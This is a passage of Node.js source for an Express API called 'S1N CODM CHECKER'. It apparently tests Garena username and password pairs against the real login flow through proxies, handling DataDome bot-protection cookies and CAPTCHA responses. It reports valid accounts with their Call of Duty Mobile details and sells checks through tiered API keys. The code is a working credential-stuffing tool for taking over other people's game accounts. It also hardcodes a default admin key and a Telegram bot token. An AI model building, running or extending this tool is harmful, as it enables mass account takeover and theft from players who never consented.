            response_prelogin = await axios.get(prelogin_url, {
                params: params_obj_prelogin,
                headers: { ...(headers_template || {}), 'Cookie': cookieStringPrelogin },
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000
            });
            
            const newCookiesFromPrelogin = parseSetCookies(response_prelogin.headers['set-cookie']);
            datadome_from_prelogin_response = newCookiesFromPrelogin['datadome'] || null; // Extract datadome if set

        } catch (e) { // Handle axios errors for prelogin
            const { raw: prelogin_text_on_error } = parseAxiosResponseData(e.response?.data, "Prelogin error response");
            if (e.response && e.response.status >= 400 && detect_captcha_in_response(prelogin_text_on_error)) {
                 logging.warning(`CAPTCHA DETECTED in prelogin HTTP error ${e.response.status} body for ${safe_username}.`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN HTTP ERROR BODY)";
            }
            if (e.code === 'ECONNABORTED') {
                logging.error(`Prelogin timed out for ${safe_username}: ${e.message}`);
                return "[⏱️] PRELOGIN TIMED OUT";
            }
            if (e.response) { // HTTP error status codes
                 const status_code = e.response.status;
                 if (status_code === 403) return `[🚫] PRELOGIN FORBIDDEN (403)`;
                 if (status_code === 429) return "[🚦] PRELOGIN RATE LIMITED (429)";
                 logging.warning(`Prelogin HTTP error ${status_code} for ${safe_username}: ${String(prelogin_text_on_error).substring(0,200)}`);
                 return `[📉] PRELOGIN HTTP ERROR ${status_code}`;
            }
            // Other unexpected errors
            const err_str = strip_ansi_codes(e.message);
            if (detect_captcha_in_response(err_str)) {
                 logging.warning(`CAPTCHA DETECTED during prelogin request error (message) for ${safe_username}: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN REQUEST ERROR MSG)";
            }
            // More specific proxy error check
            if (err_str.includes("SOCKS") || err_str.includes("Proxy Authentication") || err_str.includes("Cannot connect to proxy") || err_str.includes("Connection refused")) {
                logging.error(`Prelogin proxy connection error for ${safe_username}: ${err_str}`);
                return `[🔌] PROXY CONNECTION ERROR: ${err_str.substring(0,100)}`;
            }
            logging.exception(`Prelogin request failed unexpectedly for ${safe_username}:`, e);
            return `[🔌] PRELOGIN REQUEST FAILED: ${err_str.substring(0,100)}`;
        }

        // Process successful prelogin response
        const { data: data_prelogin, error: prelogin_parse_error, raw: prelogin_raw_text } = parseAxiosResponseData(response_prelogin.data, "Prelogin response");

        if (detect_captcha_in_response(prelogin_raw_text)) {
            logging.warning(`CAPTCHA DETECTED in prelogin response body (status ${response_prelogin.status}) for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (PRELOGIN RESPONSE BODY)";
        }
        if (prelogin_parse_error && !data_prelogin) {
            logging.error(`Invalid prelogin JSON for ${safe_username}: ${prelogin_raw_text.substring(0,200)}`);
            return `[🧩] INVALID PRELOGIN JSON (parse_error)`;
        }
        if (!data_prelogin) {
            logging.error(`Prelogin response was null/undefined after parsing for ${safe_username}. Raw: ${prelogin_raw_text.substring(0,200)}`);
            return `[🧩] INVALID PRELOGIN JSON (null_json)`;
        }


        if (data_prelogin.error) {
            const error_msg = String(data_prelogin.error);
            logging.warning(`Prelogin error field for ${safe_username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) {
                 return "[🤖] CAPTCHA REQUIRED (PRELOGIN ERROR FIELD)";
            }
            if (error_msg === 'error_account_does_not_exist') return "[👻] ACCOUNT DOESN'T EXIST";
            return `[❗] PRELOGIN ERROR: ${error_msg.substring(0,50)}`;
        }

        v1 = data_prelogin.v1;
        v2 = data_prelogin.v2;
        if (!v1 || !v2) { // Check if v1 or v2 are missing
            logging.error(`Prelogin data missing v1/v2 for ${safe_username}: ${json.stringify(data_prelogin).substring(0,200)}`);
            return "[⚠️] PRELOGIN DATA MISSING (V1/V2)";
        }

        encrypted_password_val = get_encrypted_password(password, v1, v2);
        
        let datadome_for_login_step = null;
        if (datadome_from_prelogin_response && typeof datadome_from_prelogin_response === 'string' &&
           !/^\[[🤖⚠️]\]/.test(datadome_from_prelogin_response)) { // Check if valid datadome string
            datadome_for_login_step = datadome_from_prelogin_response;
            save_datadome_to_storage(datadome_for_login_step); // Save newly acquired datadome
        } else if (datadome_for_prelogin_attempt) { // Fallback to initially provided datadome
            datadome_for_login_step = datadome_for_prelogin_attempt;
        }
        // Else, datadome_for_login_step remains null, and check_login might try to fetch one.

        // Prepare cookies for the main login step
        let login_step_cookies = { ...initial_cookies_from_system };
        if (response_prelogin && response_prelogin.headers['set-cookie']) {
            const newCookiesFromPreloginAgain = parseSetCookies(response_prelogin.headers['set-cookie']);
            // Merge, ensuring datadome isn't overwritten if already handled
            for (const cookieName in newCookiesFromPreloginAgain) {
                if (cookieName.toLowerCase() !== 'datadome') { // Don't overwrite datadome if already set for login_step
                    login_step_cookies[cookieName] = newCookiesFromPreloginAgain[cookieName];
                }
            }
        }
        
        return await check_login( // Await the result of check_login
            username, random_id,
            encrypted_password_val,
            password, // Pass original password for result formatting
            headers_template, 
            login_step_cookies,
            datadome_for_login_step, 
            date_timestamp, proxies, timeout
        );

    } catch (e) { // Catch unexpected errors in check_account logic
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA DETECTED during unexpected error in check_account for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (check_account UNEXPECTED)";
        }
        // Specific check for ReferenceError related to encryption, indicating a potential logic flaw
        if (e instanceof ReferenceError && (e.message.includes('encrypted_password') || e.message.includes('encryptedpassword'))) {
            logging.critical(`CRITICAL LOGIC FLAW: Password encryption variable not defined before use in check_account for ${safe_username}. Error: ${e.message}`, e);
            return "[💥] INTERNAL ERROR: PASSWORD ENCRYPTION STATE INVALID.";
        }
        logging.exception(`Unexpected error in check_account for ${safe_username}:`, e);
        return `[💥] UNEXPECTED ERROR (check_account): ${err_str.substring(0,100)}`;
    }
}

// Basic HTML escaping for safe display in HTML contexts (if ever needed)
function htmlEscape(text) {
    if (typeof text !== 'string') return String(text);
    return text
        .replace(/&/g, '&amp;') // Must be first
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}


// --- Express API Setup ---
const express = require('express');
const apiKeyManager = require('./api_keys_manager'); // Assume this file exists and is correctly implemented
const app = express();
const PORT = parseInt(process.env.PORT, 10) || 3000; // Ensure PORT is integer

app.use(express.json({ limit: '1mb' })); // Limit payload size
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

// Middleware for API Key Validation
const apiKeyMiddleware = async (req, res, next) => { // Made async
    const apiKeyInput = req.query.apikey || req.body.apikey || req.headers['x-api-key'];
    
    const apiKeyPreview = (typeof apiKeyInput === 'string' && apiKeyInput.length > 0) 
        ? `${apiKeyInput.substring(0, Math.min(5, apiKeyInput.length))}...` 
        : '[EMPTY/INVALID_KEY]';

    if (!apiKeyInput || typeof apiKeyInput !== 'string') {
        logging.warning(`API call attempt with missing or invalid API key format. Preview: ${apiKeyPreview}`);
        return res.status(401).json({ error: "API key is required and must be a string." });
    }

    try {
        // Assuming apiKeyManager.validateAndConsumeApiKey might be async (e.g., DB/file access)
        const validationResult = await apiKeyManager.validateAndConsumeApiKey(apiKeyInput);

        if (!validationResult || !validationResult.valid) {
            const message = (validationResult && validationResult.message) ? validationResult.message : "API key validation failed (unknown reason).";
            const status = (validationResult && validationResult.status) ? validationResult.status : 403; // Default to Forbidden
            logging.warning(`API key validation failed for key '${apiKeyPreview}': ${message}`);
            return res.status(status).json({ error: message });
        }

        req.apiKeyData = validationResult.keyData;
        logging.info(`API key '${apiKeyPreview}' (User: ${validationResult.keyData.userId}, Tier: ${validationResult.keyData.tierName}) validated for request to ${req.path}. Checks made: ${validationResult.keyData.checksMade || 0}/${validationResult.keyData.checkLimit || 'N/A'}`);
        next();
    } catch (error) {
        logging.exception(`Error during API key validation for key '${apiKeyPreview}':`, error);
        res.status(500).json({ error: "Internal server error during API key validation." });
    }
};

const ADMIN_MASTER_KEY = process.env.ADMIN_MASTER_KEY || "sinluna"; // Default key for admin actions

const adminAuthMiddleware = (req, res, next) => {
    const masterKey = req.headers['x-admin-key'];
    if (masterKey === ADMIN_MASTER_KEY) {
        next();
    } else {
        logging.warning(`Admin endpoint access denied. Path: ${req.path}. Key Used: ${masterKey ? masterKey.substring(0,3)+'...' : 'N/A'}`);
        res.status(403).json({ error: "Forbidden: Admin access required." });
    }
};


// API Endpoint for single account check (supports GET and POST)
app.all('/api/check', apiKeyMiddleware, async (req, res) => {
    const user = req.query.user || req.body.user;
    const pass = req.query.password || req.body.password; // Changed variable name from 'password' to 'pass' to avoid conflict
    const proxyParam = req.query.proxy || req.body.proxy;

    const safeUser = String(user || "").substring(0,3); // For logging

    logging.info(`/api/check called by user ${req.apiKeyData.userId} (key: ${req.apiKeyData.apiKey.substring(0,5)}...). Checking account: ${safeUser}...`);


    if (!user || !pass) {
        logging.warning(`/api/check: Missing user or password for ${safeUser}.`);
        return res.status(400).json({ error: "User and password are required." });
    }
    if (typeof user !== 'string' || typeof pass !== 'string') {
        logging.warning(`/api/check: User or password not strings for ${safeUser}.`);
        return res.status(400).json({ error: "User and password must be strings." });
    }


    let proxyForCheck = null;
    if (proxyParam) {
        if (typeof proxyParam === 'string') {
            try {
                new URL(proxyParam); // Basic validation of proxy URL format
                proxyForCheck = { http: proxyParam, https: proxyParam };
                logging.info(`/api/check: Using proxy for ${safeUser}: ${proxyParam.split('@').pop().split(':')[0]}`); // Log host only
            } catch (e) {
                logging.warning(`/api/check: Invalid proxy URL format for ${safeUser}: ${proxyParam}`);
                return res.status(400).json({ error: "Invalid proxy URL format." });
            }
        } else {
            logging.warning(`/api/check: Proxy parameter provided but not a string for ${safeUser}.`);
            return res.status(400).json({ error: "Proxy parameter must be a string." });
        }
    }

    try {
        const date_timestamp_for_check = get_current_timestamp();
        const session_initial_cookies_tuple = starting_cookies(); // Get initial cookies
        
        const result = await check_account(
            user,
            pass, // Use 'pass' here
            date_timestamp_for_check,
            session_initial_cookies_tuple,
            proxyForCheck,
            null, // datadome_for_prelogin_attempt (let check_account handle fetching if needed)
            REQUEST_TIMEOUT
        );

        // Process result
        if (typeof result === 'object' && result !== null && !Array.isArray(result)) {
            // Successful check, full data returned
            const displayLevel = (result.codm_details && result.codm_details.level !== null) ? result.codm_details.level : "N/A";
            logging.info(`/api/check: Success for ${safeUser}. CODM Level: ${displayLevel}`);
            delete result.password; // IMPORTANT: Remove password before sending to client
            return res.status(200).json({ status: "success", data: result });
        } else if (Array.isArray(result) && result[0] === "CODM_FAILURE") {
            // Garena login likely okay, but CODM part failed
            const [, fail_user, , fail_reason_raw] = result;
            const fail_reason = strip_ansi_codes(String(fail_reason_raw));
            logging.warning(`/api/check: CODM_FAILURE for ${String(fail_user || "").substring(0,3)}... Reason: ${fail_reason}`);
            return res.status(200).json({ // Still 200, but with error details
                status: "partial_success",
                message: "Garena login successful, but CODM check failed or account not linked.",
                details: fail_reason,
                error_type: "CODM_FAILURE",
                username: fail_user // Return the username it failed for
            });
        } else if (typeof result === 'string') {
            // Check failed with a specific error message string
            const error_message = strip_ansi_codes(result);
            logging.warning(`/api/check: Failed for ${safeUser}. Reason: ${error_message}`);
            
            let statusCode = 400; // Default: Bad Request (e.g., invalid input if not caught earlier)
            if (error_message.startsWith("[🤖] CAPTCHA")) statusCode = 429; // Too Many Requests (often implies rate limiting or bot detection)
            else if (error_message.includes("INCORRECT PASSWORD")) statusCode = 401; // Unauthorized
            else if (error_message.startsWith("[👻] ACCOUNT DOESN'T EXIST")) statusCode = 404; // Not Found
            else if (error_message.includes("FORBIDDEN (403)")) statusCode = 403; // Forbidden
            else if (error_message.startsWith("[⏱️]") || error_message.includes("TIMEOUT")) statusCode = 504; // Gateway Timeout
            else if (error_message.startsWith("[🔴]") || error_message.startsWith("[🔌]") || error_message.includes("CONNECTION ERROR") || error_message.includes("PROXY CONNECTION ERROR")) statusCode = 502; // Bad Gateway / Proxy Error
            else if (error_message.startsWith("[💥]") || error_message.startsWith("[🧩]") || error_message.startsWith("[⚠️]")) statusCode = 500; // Internal Server Error or Unhandled Issue

            return res.status(statusCode).json({ status: "error", message: error_message, error_type: "CHECK_FAILED" });
        } else {
            // Unexpected result type from check_account
            logging.error(`/api/check: Unexpected result type for ${safeUser}. Result: ${JSON.stringify(result).substring(0,200)}`);
            return res.status(500).json({ status: "error", error: "Internal server error: Unexpected result type from checker." });
        }

    } catch (error) { // Catch unexpected errors within the /api/check route handler
        logging.exception(`Critical error during /api/check for ${safeUser}:`, error);
        if (error.isSysExit) { // Handle custom sys.exit errors if they propagate here
            return res.status(500).json({ status: "error", error: "Critical internal error encountered during check.", details: error.message });
        }
        res.status(500).json({ status: "error", error: "Internal server error during account check.", details: strip_ansi_codes(error.message) });
    }
});


// Admin Endpoints for API Key Management
app.post('/admin/keys/add', adminAuthMiddleware, (req, res) => {
    const { userId, tierName } = req.body;
    if (!userId || !tierName) {
        return res.status(400).json({ error: "userId and tierName are required." });
    }
    if (!apiKeyManager.TIERS || !apiKeyManager.TIERS[tierName]) { // Check TIERS exists on manager
        return res.status(400).json({ error: `Invalid tierName. Valid tiers: ${apiKeyManager.TIERS ? Object.keys(apiKeyManager.TIERS).join(', ') : 'Not available'}` });
    }
    try {
        const result = apiKeyManager.addApiKey(userId, tierName);
        logging.info(`Admin: Added API key for user ${userId}, tier ${tierName}. Key: ${result.apiKey.substring(0,5)}...`);
        res.status(201).json(result);
    } catch (e) {
        logging.exception("Admin: Error adding API key:", e);
        res.status(500).json({error: "Failed to add API key.", details: e.message});
    }
});

app.post('/admin/keys/remove', adminAuthMiddleware, (req, res) => {
    const { apiKey } = req.body;
    if (!apiKey) {
        return res.status(400).json({ error: "apiKey is required." });
    }
    try {
        const result = apiKeyManager.removeApiKey(apiKey);
        if (result.error) { // Assuming removeApiKey returns { error: ... } on failure
            return res.status(404).json(result);
        }
        logging.info(`Admin: Removed API key ${apiKey.substring(0,5)}...`);
        res.status(200).json(result);
    } catch (e) {
        logging.exception("Admin: Error removing API key:", e);
        res.status(500).json({error: "Failed to remove API key.", details: e.message});
    }
});

app.get('/admin/keys/info/:apiKey', adminAuthMiddleware, (req, res) => {
    const { apiKey } = req.params;
    try {
        const result = apiKeyManager.getApiKeyInfo(apiKey);
        if (result.error) {
            return res.status(404).json(result);
        }
        res.status(200).json(result);
    } catch (e) {
        logging.exception("Admin: Error getting API key info:", e);
        res.status(500).json({error: "Failed to get API key info.", details: e.message});
    }
});

app.get('/admin/keys/user/:userId', adminAuthMiddleware, (req, res) => {
    const { userId } = req.params;
    try {
        const result = apiKeyManager.findApiKeysByUserId(userId);
        if (result.error) { // Assuming error structure if user not found or no keys
            return res.status(404).json(result);
        }
        // If result is an array of keys, or an object indicating no keys found but user exists
        res.status(200).json(result);
    } catch (e) {
        logging.exception("Admin: Error finding API keys by user ID:", e);
        res.status(500).json({error: "Failed to find API keys by user ID.", details: e.message});
    }
});

app.get('/admin/keys/all', adminAuthMiddleware, (req, res) => {
    try {
        const allKeysData = apiKeyManager.getAllKeys(); // Assuming this returns the raw keys object/map
        // Map to a safer overview structure if necessary, e.g., for admin dashboard
        const overview = Object.values(allKeysData).map(k => ({
            apiKey: k.apiKey ? `${k.apiKey.substring(0,5)}...${k.apiKey.slice(-3)}` : 'N/A', // Show partial key
            userId: k.userId,
            tierName: k.tierName,
            checksMade: k.checksMade,
            checkLimit: k.checkLimit,
            validUntil: k.validUntil ? DateTime.fromISO(k.validUntil).toFormat("yyyy-LL-dd HH:mm ZZZZ") : "N/A",
            createdAt: k.createdAt ? DateTime.fromISO(k.createdAt).toFormat("yyyy-LL-dd HH:mm ZZZZ") : "N/A",
            lastReset: k.lastReset ? DateTime.fromISO(k.lastReset).toFormat("yyyy-LL-dd HH:mm ZZZZ") : "N/A",
        }));
        res.status(200).json({ keys_overview: overview });
    } catch (e) {
        logging.exception("Admin: Error getting all API keys:", e);
        res.status(500).json({error: "Failed to get all API keys.", details: e.message});
    }
});


// Global error handler for Express
// This catches errors passed via next(err) or thrown synchronously in route handlers
app.use((err, req, res, next) => {
    // Log the full error with stack trace for server-side debugging
    logging.exception("Unhandled Express error in global handler:", err);

    if (err.isSysExit) { // Handle custom sys.exit errors
        return res.status(500).json({ error: "Critical internal process error.", details: err.message, code: err.exitCode });
    }
    // For other errors, send a generic message to the client
    res.status(err.status || 500).json({ 
        error: "Internal Server Error", 
        details: strip_ansi_codes(err.message) // Provide a cleaner message
    });
});

function displayStartupBanner() {
    const banner = `
${COLORS['CYAN']}
  ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⣀⣀⣀⠔⡪⣵⣮⣽⡿⢿⣿⣿⡿⢐⡠⢀⠀⠀⠀⠀⠀⠀
  ⢁⡠⢒⣼⡿⠿⠓⠉⠀⠀⠀⠙⢏⣔⠉⠈⣷⣷⣆⠀⠀⠀⠀
  ⠀⣰⢿⠋⠀⣴⣦⣦⣄⡀⠀⠀⠀⠙⢶⣿⣿⠟⢹⡷⡀⠀⠀
  ⡞⣴⠃⠀⠀⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠉⠻⡴⠋⣠⢿⡀⠀
  ⢡⣯⡤⡀⠀⠘⠿⣿⣷⣿⠟⠁⠀⠀⠀⠀⠀⠈⠺⢧⡄⣧⠀
  ⡾⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣶⣄⠀⠀⠀⠀⢹⡟⡆
  ⠁⢰⣿⡟⢄⠀⠀⣴⣿⣿⠀⠘⣿⣯⣿⣿⣷⡀⠀⢠⣿⡇⠇
  ⠀⠈⢃⡵⢍⠦⣄⠀⠚⠃⠀⠀⠹⣿⣿⣯⣿⡇⠠⢻⣿⡽⠀
  ⠀⠀⠀⠉⢁⡕⢍⡱⢢⡀⠀⣀⡀⠈⠉⠉⠉⢀⣴⡟⢹⡄⠀
  ⡄⠀⠀⠀⠀⢀⡺⠨⠳⣼⣿⠟⠻⣗⠄⢀⣴⡿⠋⡰⢃⡇⠀
  ⣿⣷⣄⣀⡀⢚⣿⣶⣄⡉⠁⣠⣶⣾⣿⣿⣋⠔⠋⢠⠜⠀⠀
${COLORS['YELLOW']} S1N CODM CHECKER: API VERSION${COLORS['BOLD']}${COLORS['RESET']}
`;
    console.log(banner); // Log banner to console
}


async function main_api_start() {
    const log_dir_name = "logs";
    const log_dir = path.resolve(__dirname, log_dir_name); // Absolute path for log directory
    fsExtra.ensureDirSync(log_dir); // Ensure log directory exists

    const log_file_name = `checker_api_run_${get_current_timestamp()}.log`;
    const log_file_path = path.join(log_dir, log_file_name);
    
    logging.basicConfig({
        level: logging.INFO, // Set desired log level (e.g., logging.DEBUG for more details)
        handlers: [new logging.FileHandler(log_file_path, 'utf-8')],
    });
    
    logging.info(`--- API SCRIPT STARTED (PID: ${process.pid}) ---`);
    logging.info(`Node.js Version: ${process.version}, Platform: ${platform.system()} (${platform.release()})`);
    logging.info(`Log Level: ${logging.getLevelName(logging.getLogger().level)}`);
    console.log(`${COLORS['GREY']}Logging detailed info to: ${log_file_path}${COLORS['RESET']}`);

    // Ensure data files directory exists if they are in a sub-directory (e.g., 'data/')
    // Currently, .datadome.json, .newCookies.json, api_keys.json are expected in __dirname (root)

    app.listen(PORT, '0.0.0.0', () => { // Listen on all available network interfaces
        // Clear console (optional, can be disruptive in some environments)
        // if (os.platform() === 'win32') console.log('\x1Bc'); else console.log('\x1B[2J\x1B[3J\x1B[H');
        displayStartupBanner();
        console.log(`${COLORS['GREEN']}S1N CODM CHECKER API IS LISTENING ON PORT ${PORT}${COLORS['RESET']}`);
        console.log(`${COLORS['YELLOW']}API Endpoint: http://localhost:${PORT}/api/check (GET/POST)${COLORS['RESET']}`);
        console.log(`${COLORS['CYAN']}  Required params: apikey, user, password.`);
        console.log(`${COLORS['CYAN']}  Optional param: proxy (full proxy URL string, e.g., http://user:pass@host:port).`);
        console.log(`${COLORS['YELLOW']}Admin API Endpoints for key management (require 'x-admin-key' header):${COLORS['RESET']}`);
        console.log(`  POST /admin/keys/add {userId, tierName}`);
        console.log(`  POST /admin/keys/remove {apiKey}`);
        console.log(`  GET  /admin/keys/info/:apiKey`);
        console.log(`  GET  /admin/keys/user/:userId`);
        console.log(`  GET  /admin/keys/all`);

        if (ADMIN_MASTER_KEY === "sinluna") { // Check against the actual default
            console.warn(`${COLORS['RED_BG']}WARNING: Default ADMIN_MASTER_KEY 'sinluna' is being used. Please set a strong key via ADMIN_MASTER_KEY environment variable.${COLORS['RESET']}`);
        }
        if (TELEGRAM_BOT_TOKEN === "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" || TELEGRAM_CHAT_ID === "6542321044") {
            logging.warning("Default/Placeholder Telegram token/chat ID detected. Telegram notifications might not work or go to an unintended destination.");
        }
    });
}

if (require.main === module) { 
    main_api_start().catch(err => {
        const clean_error_msg = strip_ansi_codes(String(err.message || err));
        console.error(`${COLORS['RED_BG']}${COLORS['WHITE']} 💥 A CRITICAL ERROR OCCURRED DURING API STARTUP: ${htmlEscape(clean_error_msg)} ${COLORS['RESET']}`);
        if (logging && typeof logging.critical === 'function') { // Check if logging is available
            logging.critical("CRITICAL ERROR IN API STARTUP", err);
        }
        process.exit(1); // Exit with error code
    });
}

// Graceful shutdown handling
function gracefulShutdown(signal) {
    console.log(`\n${COLORS['RED']}🛑 Received ${signal}. Shutting down gracefully...${COLORS['RESET']}`);
    logging.warning(`Received ${signal}. Shutting down.`);
    // Add any cleanup tasks here (e.g., closing database connections)
    // For Express, the server might need to be closed explicitly if it's stored
    // server.close(() => {
    //    logging.info("HTTP server closed.");
    //    process.exit(0);
    // });
    // Set a timeout to force exit if cleanup takes too long
    setTimeout(() => {
        logging.error("Graceful shutdown timed out. Forcing exit.");
        process.exit(1);
    }, 5000); // 5 seconds timeout
    process.exit(0); // Simple exit for now
}

process.on('SIGINT', () => gracefulShutdown('SIGINT')); // Ctrl+C
process.on('SIGTERM', () => gracefulShutdown('SIGTERM')); // kill command

process.on('exit', (code) => {
    if (logging && typeof logging.info === 'function') {
        logging.info(`--- SCRIPT FINISHED WITH CODE ${code} ---`);
    }
    console.log(Style.RESET_ALL); // Reset terminal colors
});

process.on('unhandledRejection', (reason, promise) => {
    if (logging && typeof logging.critical === 'function') {
        logging.critical('Unhandled Rejection at:', promise, 'reason:', reason);
    } else {
        console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    }
    // Optionally, exit the process for unhandled rejections, as they can leave the app in an unstable state
    // process.exit(1); 
});

process.on('uncaughtException', (error) => {
    if (logging && typeof logging.critical === 'function') {
        logging.critical('Uncaught Exception:', error);
    } else {
        console.error('Uncaught Exception:', error);
    }
    // For uncaught exceptions, it's generally recommended to exit, as the application state is unknown.
    process.exit(1);
});
